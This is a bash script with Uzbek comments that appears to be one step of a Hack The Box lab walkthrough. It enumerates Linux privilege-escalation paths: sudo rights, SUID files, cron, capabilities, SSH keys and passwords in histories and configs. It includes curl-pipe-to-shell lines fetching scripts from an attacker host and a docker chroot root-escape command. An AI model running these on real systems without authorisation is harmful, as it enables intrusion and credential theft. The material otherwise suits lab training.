#!/usr/bin/env bash
# ============================================================
# Kohorta (HTB, Easy, Linux) — QADAM 3: privesc enumeration
#
# TARGET ICHIDA ishga tushiriladi (walter/www-data/user shell'idan).
# Read-only tekshiruvlar — hech narsani o'zgartirmaydi.
#
#   curl -s http://<LHOST>:8000/03_privesc.sh | bash
#   yoki nusxa ko'chirib: bash 03_privesc.sh
# ============================================================
set -uo pipefail

sec() { printf '\n\033[1;36m=== %s ===\033[0m\n' "$*"; }
hit() { printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
warn(){ printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
q()   { command -v "$1" >/dev/null 2>&1; }

sec "0. Asosiy ma'lumot"
echo "user : $(id)"
echo "host : $(hostname 2>/dev/null)"
echo "uname: $(uname -a)"
[ -f /etc/os-release ] && grep -E '^(PRETTY_NAME|VERSION)=' /etc/os-release

sec "1. sudo ruxsatlari"
if q sudo; then
    sudo -n -l 2>&1 | head -30 || warn "sudo -n ishlamadi (parol kerak yoki ruxsat yo'q)"
else
    warn "sudo yo'q"
fi

sec "2. SUID / SGID binarlar"
find / -perm -4000 -type f 2>/dev/null | sort | while read -r f; do
    printf 'SUID %s\n' "$f"; done | tee /tmp/_suid.txt
find / -perm -2000 -type f 2>/dev/null | sort | while read -r f; do
    printf 'SGID %s\n' "$f"; done | tee /tmp/_sgid.txt
hit "GTFOBins tekshiring: https://gtfobins.github.io/"
warn "Uncommon SUID (oddiy tizimda bo'lmaydigan):"
grep -vE '/(sudo|su|passwd|mount|umount|ping|pkexec|chsh|chfn|newgrp|gpasswd|fusermount|ntfs-3g|vmware-user-suid-wrapper|dbus-daemon-launch-helper|exim4|sssd)($|\.)' /tmp/_suid.txt 2>/dev/null || true

sec "3. Capabilities"
if q getcap; then
    getcap -r / 2>/dev/null | head -40
else
    warn "getcap yo'q"
fi

sec "4. Cron"
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ 2>/dev/null
ls -la /var/spool/cron/crontabs/ /var/spool/cron/ 2>/dev/null
for f in /etc/cron.d/* /etc/crontab; do
    [ -f "$f" ] && grep -vE '^\s*#|^\s*$' "$f" 2>/dev/null
done
warn "Cron fayllari writable bo'lsa — priv esc:"
find /etc/cron* /var/spool/cron -writable 2>/dev/null

sec "5. Muhim fayllar"
for f in /etc/passwd /etc/shadow /etc/sudoers /root /home; do
    printf '%-16s ' "$f"; ls -ld "$f" 2>/dev/null || echo "(yo'q)"
done
[ -r /etc/shadow ] && hit "/etc/shadow O'QILADI!"
[ -w /etc/passwd ] && hit "/etc/passwd YOZILADI — root qo'shish mumkin!"

sec "6. Guruh a'zoligi (priv esc vektorlari)"
id -nG 2>/dev/null | tr ' ' '\n' | grep -xE 'docker|lxd|adm|disk|sudo|wheel|shadow|video' && \
    hit "Yuqoridagi guruhlar priv esc beradi (docker -> root: docker run -v /:/mnt --rm -it alpine chroot /mnt sh)"

sec "7. Tarmoq tinglovchilari"
(q ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null) | head -30

sec "8. Ishlab turgan root jarayonlar (parol argumentda?)"
ps aux 2>/dev/null | awk '$1=="root"' | grep -aiE 'password|passwd|-p |--pass|token|secret|ftp|mysql|ssh' | head -20

sec "9. Home papkalari va tarix"
ls -la /home/ 2>/dev/null
for h in /home/* /root; do
    [ -r "$h/.bash_history" ] && { echo "--- $h/.bash_history ---"; tail -30 "$h/.bash_history" 2>/dev/null; }
done 2>/dev/null
find /home -name 'id_rsa*' -o -name '*.key' -o -name '*.pem' 2>/dev/null | head -20

sec "10. Writablesiz bo'lmagan muhim joylar"
find / -xdev -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|dev|tmp|var/tmp|run)' | head -30

sec "11. Kernel / OS versiyasi (exploit tavsiyasi)"
echo "kernel: $(uname -r)"
echo "PwnKit (CVE-2021-4034) tekshirish:"
ls -la /usr/bin/pkexec 2>/dev/null || echo "  pkexec yo'q"
echo "sudo versiyasi (CVE-2021-3156 baron samedit):"
sudo --version 2>/dev/null | head -1

sec "12. Qiziqarli konfiguratsiya fayllari"
grep -rliE 'password|passwd|secret' /var/www /opt /srv /etc/*.conf 2>/dev/null | head -20
find / -maxdepth 4 -name '*.db' -o -name '*.sqlite*' -o -name '.env' 2>/dev/null | grep -vE '^/(proc|sys)' | head -20

sec "XULOSA"
cat <<'TXT'
  Ustuvor tekshiruvlar:
    1) sudo -l        -> GTFOBins (https://gtfobins.github.io/)
    2) SUID/SGID      -> GTFOBins
    3) cron           -> writable skript / yo'l hijack
    4) capabilities   -> cap_setuid+ep / cap_dac_read_search
    5) guruh          -> docker/lxd/disk
    6) kernel/CVE     -> searchsploit "<kernel>" linux local
    7) parollar       -> bash_history, config, .env, DB

  Avtomatik to'liq skanerlash uchun LINPEAS:
    # Kali'da:  python3 -m http.server 8000
    # targetda: curl -s http://<LHOST>:8000/linpeas.sh | sh
TXT